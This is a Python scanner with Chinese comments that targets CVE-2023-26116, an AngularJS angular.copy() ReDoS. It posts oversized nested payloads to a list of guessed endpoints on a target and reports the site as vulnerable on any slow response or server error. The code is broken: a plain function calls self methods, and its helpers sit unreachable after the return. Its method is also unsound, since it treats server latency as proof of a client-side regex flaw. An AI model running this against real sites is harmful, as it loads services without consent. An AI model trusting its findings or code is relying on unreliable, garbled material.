"""
CVE-2023-26116 Vulnerability Detection Script
AngularJS angular.copy() ReDoS - CVSS 5.3 (Medium)
HeroDevs Vulnerability Directory - 最佳驗證路徑
影響版本: AngularJS ≥ 1.2.21
"""

import requests
import time
import json
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2023-26116 弱點
    AngularJS angular.copy() ReDoS 攻擊
    最佳驗證路徑：測試複雜物件結構導致的拷貝災難性回溯
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2023-26116: AngularJS angular.copy() ReDoS 弱點，特製的複雜物件結構可導致深拷貝時災難性回溯',
        'remediation': '更新到 HeroDevs NES 版本，避免對不可信輸入使用 angular.copy()，實施物件深度和大小限制'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2023-26116 angular.copy() ReDoS 弱點...")
        
        # Step 1: 檢測 AngularJS 和 angular.copy 使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'angular.module'
        ]
        
        copy_indicators = [
            'angular.copy',
            '.copy(',
            'angular.copy(',
            'copy function',
            'deepCopy',
            'clone',
            'angular.extend',
            'angular.merge'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_copy = any(indicator in response.text for indicator in copy_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，angular.copy 檢測: {'是' if uses_copy else '否'}")
        
        # Step 2: 檢查 angular.copy 相關的代碼模式
        copy_usage_patterns = [
            r'angular\.copy\s*\(',
            r'\.copy\s*\(',
            r'angular\.extend\s*\(',
            r'angular\.merge\s*\(',
            r'deepCopy\s*\(',
            r'clone\s*\(',
            r'copy\s*:\s*function'
        ]
        
        found_copy_usage = []
        for pattern in copy_usage_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_copy_usage.extend(matches)
        
        if found_copy_usage:
            print(f"      [檢測] 發現 {len(found_copy_usage)} 個拷貝相關函數使用")
            uses_copy = True
        
        # Step 3: 構造 CVE-2023-26116 特定 ReDoS 攻擊負載
        # 基於對 angular.copy() 內部實作的分析，構造導致災難性回溯的物件結構
        copy_redos_payloads = [
            {
                'payload': {
                    'level1': {
                        'data': 'x' * 1000,
                        'level2': {
                            'data': 'y' * 1000,
                            'level3': {
                                'data': 'z' * 1000,
                                'array': ['item' + str(i) for i in range(200)]
                            }
                        }
                    }
                },
                'description': 'Deep nested object with large strings',
                'expected_delay': 1.0,
                'severity': 'medium'
            },
            {
                'payload': {
                    'circular_ref_base': 'test',
                    'large_array': ['element_' + str(i) * 50 for i in range(300)],
                    'nested': {
                        'deep': {
                            'very_deep': {
                                'content': 'a' * 2000
                            }
                        }
                    }
                },
                'description': 'Large array with deep nesting',
                'expected_delay': 2.0,
                'severity': 'high'
            },
            {
                'payload': {
                    'matrix': [['cell_' + str(i) + '_' + str(j) for j in range(50)] for i in range(50)],
                    'metadata': {
                        'description': 'complex' * 500,
                        'tags': ['tag' + str(i) for i in range(100)]
                    }
                },
                'description': 'Matrix-like structure with metadata',
                'expected_delay': 1.5,
                'severity': 'medium'
            },
            {
                'payload': {
                    'recursive_structure': {
                        'name': 'level_' + str(i),
                        'children': [
                            {
                                'name': 'child_' + str(j),
                                'data': 'content_' * 100
                            } for j in range(30)
                        ]
                    } for i in range(20)
                },
                'description': 'Recursive tree-like structure',
                'expected_delay': 2.5,
                'severity': 'high'
            }
        ]
        
        # Step 4: 測試支援物件拷貝的 API 端點
        copy_endpoints = [
            '/api/copy',
            '/api/clone',
            '/api/duplicate',
            '/api/backup',
            '/api/save',
            '/api/update',
            '/api/create',
            '/copy',
            '/clone',
            '/duplicate'
        ]
        
        general_endpoints = [
            '/api/user',
            '/api/profile',
            '/api/config',
            '/api/data',
            '/api/object',
            '/api/settings'
        ]
        
        all_endpoints = copy_endpoints + general_endpoints
        
        print(f"      [檢測] 開始測試 {len(copy_redos_payloads)} 個 angular.copy() ReDoS 負載...")
        
        for endpoint in all_endpoints:
            try:
                # 檢查端點可用性
                test_response = session.get(urljoin(target_url, endpoint), timeout=10)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in copy_redos_payloads:
                    complex_object = payload_data['payload']
                    description = payload_data['description']
                    expected_delay = payload_data['expected_delay']
                    severity = payload_data['severity']
                    
                    try:
                        # 測試不同的拷貝相關參數名稱
                        test_data = {
                            'copy_data': complex_object,
                            'clone_object': complex_object,
                            'duplicate_data': complex_object,
                            'backup_object': complex_object,
                            'source_object': complex_object,
                            'object_to_copy': complex_object
                        }
                        
                        print(f"      [檢測] 執行 {description}...")
                        
                        # 執行請求並測量物件處理時間
                        start_time = time.time()
                        
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=test_data,
                            headers=headers,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        print(f"      [檢測] 物件拷貝處理耗時: {duration:.2f} 秒")
                        
                        # 判斷是否存在 ReDoS
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 CVE-2023-26116 angular.copy() ReDoS 弱點！\n\n攻擊詳情:\n- 負載: {description}\n- 物件複雜度: {self._calculate_object_complexity(complex_object)}\n- 處理時間: {duration:.2f} 秒 (預期: {expected_delay:.1f}秒)\n- 嚴重程度: {severity}\n\n這證明了 AngularJS angular.copy() 在處理複雜物件結構時發生災難性回溯，攻擊者可利用此弱點造成應用程式拒絕服務。"
                            return result
                        
                        # 檢查記憶體使用相關的錯誤
                        if response.status_code >= 500:
                            error_indicators = ['memory', 'stack', 'overflow', 'limit', 'timeout']
                            if any(indicator in response.text.lower() for indicator in error_indicators):
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 angular.copy() 記憶體/堆疊問題。{description} 導致伺服器錯誤，可能因複雜物件拷貝造成資源耗盡。"
                                return result
                        
                        # 測試直接的 JSON 物件
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=complex_object,
                            headers=headers,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 angular.copy() ReDoS 弱點 (直接物件)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                        
                        # 測試 Form-encoded 格式 (會觸發物件轉換)
                        try:
                            flattened_data = self._flatten_object(complex_object, 'obj')
                            start_time = time.time()
                            
                            response = session.post(
                                urljoin(target_url, endpoint),
                                data=flattened_data,
                                timeout=30
                            )
                            
                            end_time = time.time()
                            duration = end_time - start_time
                            
                            if duration > expected_delay:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 angular.copy() ReDoS 弱點 (表單格式)。{description} 耗時 {duration:.2f} 秒。"
                                return result
                        except:
                            pass
                            
                    except requests.exceptions.Timeout:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現嚴重的 CVE-2023-26116 angular.copy() ReDoS 弱點！{description} 導致請求逾時 (>30秒)，證明複雜物件拷貝發生了災難性回溯。這是高風險弱點，可導致應用程式無響應。"
                        return result
                    
                    except Exception as e:
                        if "timeout" in str(e).lower() or "memory" in str(e).lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 angular.copy() ReDoS 弱點。{description} 導致資源問題: {str(e)}"
                            return result
                        continue
                        
            except Exception as e:
                continue
        
        # Step 5: 測試特定的物件操作場景
        print("      [檢測] 測試特定物件操作場景...")
        
        # 測試物件合併場景
        merge_payloads = [
            {
                'source': {'data': 'a' * 500},
                'target': {'nested': {'deep': 'b' * 500}},
                'merge_deep': True
            },
            {
                'settings': {'config': ['item' + str(i) for i in range(100)]},
                'defaults': {'fallback': 'default' * 100}
            }
        ]
        
        for merge_data in merge_payloads:
            for endpoint in ['/api/merge', '/api/config', '/api/settings']:
                try:
                    start_time = time.time()
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=merge_data,
                        timeout=20
                    )
                    
                    end_time = time.time()
                    duration = end_time - start_time
                    
                    if duration > 1.0:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現物件合併 ReDoS。merge 操作耗時 {duration:.2f} 秒。"
                        return result
                        
                except requests.exceptions.Timeout:
                    result['vulnerable'] = True
                    result['evidence'] = f"物件合併操作導致逾時，存在 angular.copy() ReDoS 風險。"
                    return result
                except:
                    continue
        
        # Step 6: 檢查現有的物件拷貝實作
        print("      [檢測] 分析現有的物件拷貝實作...")
        
        if found_copy_usage:
            # 檢查是否有不安全的拷貝模式
            unsafe_patterns = []
            for usage in found_copy_usage:
                # 檢查是否直接拷貝使用者輸入
                context_patterns = [
                    r'angular\.copy\s*\(\s*req\.',
                    r'angular\.copy\s*\(\s*request\.',
                    r'angular\.copy\s*\(\s*data\.',
                    r'angular\.copy\s*\(\s*input\.',
                    r'angular\.copy\s*\(\s*params\.'
                ]
                
                for pattern in context_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        unsafe_patterns.append(pattern)
            
            if unsafe_patterns:
                print(f"      [檢測] 發現 {len(unsafe_patterns)} 個可能不安全的拷貝模式")
                if uses_copy:
                    result['evidence'] += f" 發現可能直接拷貝使用者輸入的不安全模式。"
        
        # Step 7: 執行輕量級物件複雜度測試
        print("      [檢測] 執行輕量級物件複雜度測試...")
        
        lightweight_objects = [
            {'simple': 'test', 'array': [str(i) for i in range(50)]},
            {'nested': {'level1': {'level2': 'data' * 50}}},
            {'mixed': {'str': 'x' * 100, 'list': ['item'] * 30, 'dict': {'key': 'value'}}}
        ]
        
        for obj in lightweight_objects:
            for endpoint in ['/api/test', '/test', '/api/copy']:
                try:
                    start_time = time.time()
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json={'data': obj, 'copy_me': obj},
                        timeout=10
                    )
                    
                    end_time = time.time()
                    duration = end_time - start_time
                    
                    if duration > 0.5:  # 500ms 閾值
                        print(f"      [檢測] 在 {endpoint} 檢測到物件處理延遲 ({duration:.2f}s)")
                        if uses_copy:
                            result['evidence'] += f" 輕量級測試顯示物件拷貝存在效能問題。"
                            
                except:
                    continue
        
        # 最終結果
        if uses_copy and found_copy_usage:
            result['evidence'] = f"檢測摘要: 發現 AngularJS angular.copy() 使用，包含 {len(found_copy_usage)} 個實例。測試了 {len(all_endpoints)} 個端點和 {len(copy_redos_payloads)} 個複雜物件負載。雖未觸發明確攻擊，但建議檢查物件拷貝實作並避免處理不可信的複雜物件。"
        elif uses_copy:
            result['evidence'] = f"檢測到物件拷貝相關代碼，但未發現明確的 ReDoS 弱點。建議審查拷貝操作的實作。"
        else:
            result['evidence'] = f"完成 CVE-2023-26116 檢測。未明確檢測到 angular.copy() 使用，測試了 {len(all_endpoints)} 個端點，未發現相關 ReDoS 弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result

    def _calculate_object_complexity(self, obj):
        """計算物件複雜度"""
        try:
            if isinstance(obj, dict):
                return f"字典: {len(obj)} 鍵值, 深度約 {self._get_dict_depth(obj)}"
            elif isinstance(obj, list):
                return f"陣列: {len(obj)} 元素"
            else:
                return f"簡單物件: {type(obj).__name__}"
        except:
            return "複雜物件"
    
    def _get_dict_depth(self, d, depth=0):
        """獲取字典深度"""
        try:
            if isinstance(d, dict) and d:
                return max(self._get_dict_depth(v, depth+1) for v in d.values())
            return depth
        except:
            return depth
    
    def _flatten_object(self, obj, prefix=''):
        """扁平化物件為表單格式"""
        try:
            result = {}
            if isinstance(obj, dict):
                for key, value in obj.items():
                    new_key = f"{prefix}[{key}]" if prefix else key
                    if isinstance(value, (dict, list)):
                        result.update(self._flatten_object(value, new_key))
                    else:
                        result[new_key] = str(value)
            elif isinstance(obj, list):
                for i, value in enumerate(obj):
                    new_key = f"{prefix}[{i}]"
                    if isinstance(value, (dict, list)):
                        result.update(self._flatten_object(value, new_key))
                    else:
                        result[new_key] = str(value)
            else:
                result[prefix] = str(obj)
            return result
        except:
            return {prefix: str(obj)}